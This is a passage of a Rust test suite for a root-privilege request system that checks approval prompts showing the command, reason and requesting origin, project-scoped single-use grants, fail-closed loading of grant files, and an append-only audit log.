    fn the_prompt_shows_the_command_the_reason_and_the_effect() {
        let p = req(Verb::Install {
            packages: vec!["clang".into()],
        })
        .prompt();
        assert!(p.contains("rime install clang"), "{p}");
        assert!(p.contains("Required to compile the project"), "{p}");
        assert!(p.contains("Reason"), "{p}");
        assert!(p.contains("Effect"), "{p}");
        assert!(p.contains("/home/tester/Projects/demo"), "{p}");
    }

    #[test]
    fn the_prompt_names_the_origin_the_request_came_from() {
        // §7's table has two columns and the human reading this prompt is
        // deciding which one applies. A prompt that did not say would be
        // asking them to authorise root without telling them who is asking.
        let mut r = req(Verb::Update);
        r.request_origin = Some(RequestOrigin::RemoteControl);
        r.origin_source = Some(OriginSource::Declared);
        let p = r.prompt();
        assert!(p.contains("Origin:"), "{p}");
        assert!(p.contains("claude-remote-control"), "{p}");
        assert!(p.contains("declared"), "{p}");
        assert!(!r.is_local());

        r.request_origin = Some(RequestOrigin::LocalTerminal);
        r.origin_source = Some(OriginSource::Observed);
        assert!(r.prompt().contains("local-terminal"), "{}", r.prompt());
        assert!(r.is_local());
    }

    #[test]
    fn a_request_with_no_recorded_origin_is_shown_as_unknown_not_as_local() {
        // A record filed before origin tracking existed. `local-terminal` is
        // the enum's Default, so the failure mode this guards is the field
        // deserialising to the one origin §7 reserves root for.
        let mut r = req(Verb::Update);
        r.request_origin = None;
        r.origin_source = None;
        assert!(!r.is_local(), "an unrecorded origin is not evidence of presence");
        let summary = r.origin_summary();
        assert!(summary.contains("unknown"), "{summary}");
        assert!(r.prompt().contains("unknown"), "{}", r.prompt());
    }

    #[test]
    fn a_stored_request_without_an_origin_key_loads_without_becoming_local() {
        // The on-disk half of the same property: the JSON an older daemon
        // wrote has no `request_origin` at all.
        let r = req(Verb::Pin);
        let text = serde_json::to_string(&r).unwrap();
        let mut v: serde_json::Value = serde_json::from_str(&text).unwrap();
        {
            let obj = v.as_object_mut().unwrap();
            assert!(obj.remove("request_origin").is_some(), "never written");
            assert!(obj.remove("origin_source").is_some(), "never written");
        }
        let old: PrivilegeRequest = serde_json::from_value(v).expect("an old record still loads");
        assert_eq!(old.request_origin, None);
        assert!(!old.is_local());
    }

    #[test]
    fn every_verb_has_an_effect_line_that_says_something() {
        for verb in [
            Verb::Install {
                packages: vec!["clang".into()],
            },
            Verb::Remove {
                packages: vec!["htop".into()],
            },
            Verb::PkgUpgrade,
            Verb::PkgRebuild,
            Verb::PkgRollback,
            Verb::Pin,
            Verb::Rollback,
            Verb::Update,
        ] {
            let e = verb.effect();
            assert!(e.len() > 12, "{verb:?} has a useless effect line: {e:?}");
            assert!(!e.contains("TODO"));
        }
    }

    // ── grants ──────────────────────────────────────────────────────────────

    #[test]
    fn a_grant_is_scoped_to_the_project_and_the_exact_arguments() {
        let mut g = Grants::default();
        let clang = Verb::Install {
            packages: vec!["clang".into()],
        };
        let cmake = Verb::Install {
            packages: vec!["cmake".into()],
        };
        g.allow("/p/a", &clang);

        assert!(g.allows(Some("/p/a"), &clang));
        // Not another package.
        assert!(!g.allows(Some("/p/a"), &cmake));
        // Not another project.
        assert!(!g.allows(Some("/p/b"), &clang));
        // Not a session with no project at all.
        assert!(!g.allows(None, &clang));
    }

    #[test]
    fn a_grant_ignores_the_order_the_packages_were_named_in() {
        // Otherwise `install a b` and `install b a` are two different grants,
        // and a user who allowed one would be prompted again for what they
        // believe they already allowed — or, worse, would stop reading.
        let mut g = Grants::default();
        let ab = Verb::Install {
            packages: vec!["a".into(), "b".into()],
        };
        let ba = Verb::Install {
            packages: vec!["b".into(), "a".into()],
        };
        g.allow("/p", &ab);
        assert!(g.allows(Some("/p"), &ba));
    }

    #[test]
    fn a_grant_for_one_verb_does_not_leak_into_another() {
        let mut g = Grants::default();
        g.allow("/p", &Verb::PkgUpgrade);
        assert!(g.allows(Some("/p"), &Verb::PkgUpgrade));
        assert!(!g.allows(Some("/p"), &Verb::Update));
        assert!(!g.allows(Some("/p"), &Verb::Rollback));
        assert!(!g.allows(
            Some("/p"),
            &Verb::Install {
                packages: vec!["anything".into()]
            }
        ));
    }

    #[test]
    fn allowing_the_same_thing_twice_records_it_once() {
        let mut g = Grants::default();
        let v = Verb::Pin;
        g.allow("/p", &v);
        g.allow("/p", &v);
        assert_eq!(g.projects.get("/p").unwrap().len(), 1);
    }

    // ── decisions ───────────────────────────────────────────────────────────

    #[test]
    fn only_an_allow_permits_execution() {
        assert!(!Decision::Pending.is_allowed());
        assert!(!Decision::Denied.is_allowed());
        assert!(Decision::AllowOnce.is_allowed());
        assert!(Decision::AllowForProject.is_allowed());
    }

    #[test]
    fn a_decision_round_trips_by_name() {
        for d in [
            Decision::Pending,
            Decision::AllowOnce,
            Decision::AllowForProject,
            Decision::Denied,
        ] {
            assert_eq!(Decision::parse(d.as_str()), Some(d));
        }
        assert_eq!(Decision::parse("maybe"), None);
    }

    #[test]
    fn an_approved_request_can_only_execute_once() {
        // Otherwise one approval of `rime update` is an unlimited licence to
        // run it.
        let mut r = req(Verb::Update);
        r.decision = Decision::AllowOnce;
        assert!(r.is_executable());
        r.executed_ms = Some(now_ms());
        assert!(!r.is_executable());
    }

    #[test]
    fn a_pending_or_denied_request_is_never_executable() {
        let mut r = req(Verb::Update);
        assert!(!r.is_executable());
        r.decision = Decision::Denied;
        assert!(!r.is_executable());
    }

    // ── the store ───────────────────────────────────────────────────────────

    fn tmpdir(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!(
            "rime-req-{}-{}-{}",
            std::process::id(),
            tag,
            now_ms()
        ));
        crate::paths::ensure_private_dir(&d).expect("mkdir");
        d
    }

    #[test]
    fn a_request_survives_a_round_trip_through_the_store() {
        let d = tmpdir("store");
        let r = req(Verb::Install {
            packages: vec!["clang".into()],
        });
        save(&d, &r).expect("save");
        let back = load(&d, r.id).expect("load").expect("present");
        assert_eq!(back.argv(), r.argv());
        assert_eq!(back.reason, r.reason);
        assert_eq!(back.session, r.session);
        std::fs::remove_dir_all(&d).ok();
    }

    #[test]
    fn ids_are_never_reused_after_a_deletion() {
        // An audit trail in which id 3 means two different operations is not an
        // audit trail.
        let d = tmpdir("ids");
        for id in 1..=3 {
            let mut r = req(Verb::Pin);
            r.id = id;
            r.created_ms = 1_000 + id as u64;
            save(&d, &r).expect("save");
        }
        assert_eq!(next_id(&d), 4);
        std::fs::remove_file(d.join("3.json")).expect("rm");
        assert_eq!(next_id(&d), 3, "ids may be reused only when nothing above");
        // The case that matters: the highest is kept, so a hole lower down does
        // not cause reuse.
        let mut r = req(Verb::Pin);
        r.id = 9;
        r.created_ms = 2_000;
        save(&d, &r).expect("save");
        assert_eq!(next_id(&d), 10);
        std::fs::remove_dir_all(&d).ok();
    }

    #[test]
    fn one_corrupt_record_does_not_hide_the_others() {
        // The state in which a user starts approving without reading.
        let d = tmpdir("corrupt");
        let mut r = req(Verb::Pin);
        r.id = 1;
        save(&d, &r).expect("save");
        std::fs::write(d.join("2.json"), b"{ not json").expect("write");
        r.id = 3;
        r.created_ms += 10;
        save(&d, &r).expect("save");

        let all = list(&d).expect("list");
        assert_eq!(all.len(), 2);
        assert_eq!(all[0].id, 1);
        assert_eq!(all[1].id, 3);
        std::fs::remove_dir_all(&d).ok();
    }

    #[test]
    fn listing_is_ordered_by_millisecond_not_by_id() {
        let d = tmpdir("order");
        let mut a = req(Verb::Pin);
        a.id = 2;
        a.created_ms = 1_000;
        let mut b = req(Verb::Pin);
        b.id = 1;
        b.created_ms = 2_000;
        save(&d, &a).expect("save");
        save(&d, &b).expect("save");
        let all = list(&d).expect("list");
        assert_eq!(all.iter().map(|r| r.id).collect::<Vec<_>>(), vec![2, 1]);
        std::fs::remove_dir_all(&d).ok();
    }

    #[test]
    fn the_audit_log_is_append_only_and_one_json_object_per_line() {
        let d = tmpdir("audit");
        let log = d.join("audit.jsonl");
        let mut r = req(Verb::Install {
            packages: vec!["clang".into()],
        });
        audit(&log, "requested", &r).expect("audit");
        r.decision = Decision::AllowOnce;
        audit(&log, "approved", &r).expect("audit");
        r.exit_code = Some(0);
        audit(&log, "executed", &r).expect("audit");

        let text = std::fs::read_to_string(&log).expect("read");
        let lines: Vec<&str> = text.lines().collect();
        assert_eq!(lines.len(), 3, "appends must not overwrite");
        for line in &lines {
            let v: serde_json::Value = serde_json::from_str(line).expect("each line is JSON");
            assert!(v.get("ms").is_some());
            assert!(v.get("event").is_some());
            assert!(v.get("argv").is_some());
        }
        let events: Vec<String> = lines
            .iter()
            .map(|l| {
                serde_json::from_str::<serde_json::Value>(l).unwrap()["event"]
                    .as_str()
                    .unwrap()
                    .to_string()
            })
            .collect();
        assert_eq!(events, ["requested", "approved", "executed"]);
        std::fs::remove_dir_all(&d).ok();
    }

    #[test]
    fn the_audit_line_records_the_origin_and_how_it_was_established() {
        // P0-013's third criterion. The origin alone is not enough: a line
        // saying `claude-remote-control` without saying whether the daemon
        // observed it or a client asked for it cannot answer the question an
        // audit trail is read to answer.
        let d = tmpdir("audit-origin");
        let log = d.join("audit.jsonl");
        let mut r = req(Verb::Update);
        r.request_origin = Some(RequestOrigin::RemoteControl);
        r.origin_source = Some(OriginSource::Declared);
        audit(&log, "requested", &r).expect("audit");

        let text = std::fs::read_to_string(&log).expect("read");
        let v: serde_json::Value = serde_json::from_str(text.trim()).expect("one JSON object");
        assert_eq!(v["request_origin"], "claude-remote-control");
        assert_eq!(v["origin_source"], "declared");

        // And a request with none recorded says so with a null rather than
        // borrowing the previous line's answer or the enum's default.
        r.request_origin = None;
        r.origin_source = None;
        audit(&log, "requested", &r).expect("audit");
        let text = std::fs::read_to_string(&log).expect("read");
        let last: serde_json::Value =
            serde_json::from_str(text.lines().last().unwrap()).expect("JSON");
        assert!(last["request_origin"].is_null(), "{last}");
        std::fs::remove_dir_all(&d).ok();
    }

    #[test]
    fn the_audit_line_names_the_system_grant_that_decided_the_request() {
        // §4.4's audit criterion. A request decided by a session grant and one
        // decided by a standing project grant look identical in the trail
        // unless the line says which — and only one of them is still true five
        // minutes later.
        let d = tmpdir("audit-grant");
        let log = d.join("audit.jsonl");
        let mut r = req(Verb::Update);
        r.decision = Decision::AllowOnce;
        r.system_grant = Some(3);
        audit(&log, "requested-and-covered", &r).expect("audit");

        let text = std::fs::read_to_string(&log).expect("read");
        let v: serde_json::Value = serde_json::from_str(text.trim()).expect("one JSON object");
        assert_eq!(v["event"], "requested-and-covered");
        assert_eq!(v["decision"], "allow_once");
        assert_eq!(v["system_grant"], 3, "the line must join to the grant: {v}");

        // A request no grant covered says so with a null, rather than leaving
        // the key out and letting a reader assume the previous line's answer.
        r.system_grant = None;
        r.decision = Decision::Pending;
        audit(&log, "requested", &r).expect("audit");
        let text = std::fs::read_to_string(&log).expect("read");
        let last: serde_json::Value =
            serde_json::from_str(text.lines().last().unwrap()).expect("JSON");
        assert!(last["system_grant"].is_null(), "{last}");
        std::fs::remove_dir_all(&d).ok();
    }

    #[test]
    fn grants_survive_a_round_trip_through_the_store() {
        let d = tmpdir("grants");
        let path = d.join("grants.json");
        let mut g = Grants::default();
        g.allow("/p/a", &Verb::Pin);
        g.allow(
            "/p/a",
            &Verb::Install {
                packages: vec!["clang".into()],
            },
        );
        g.save(&path).expect("save");

        let back = Grants::load(&path);
        assert!(back.allows(Some("/p/a"), &Verb::Pin));
        assert!(back.allows(
            Some("/p/a"),
            &Verb::Install {
                packages: vec!["clang".into()]
            }
        ));
        assert!(!back.allows(Some("/p/a"), &Verb::Update));
        std::fs::remove_dir_all(&d).ok();
    }

    #[test]
    fn a_missing_grants_file_is_an_empty_grant_set_not_an_error() {
        // Fail closed: an unreadable policy file must deny, not allow.
        let g = Grants::load(Path::new("/nonexistent/grants.json"));
        assert!(!g.allows(Some("/p"), &Verb::Pin));
    }

    #[test]
    fn a_corrupt_grants_file_denies_everything() {
        let d = tmpdir("badgrants");
        let path = d.join("grants.json");
        std::fs::write(&path, b"{ not json").expect("write");
        let g = Grants::load(&path);
        assert!(!g.allows(Some("/p"), &Verb::Pin));
        std::fs::remove_dir_all(&d).ok();
    }
}
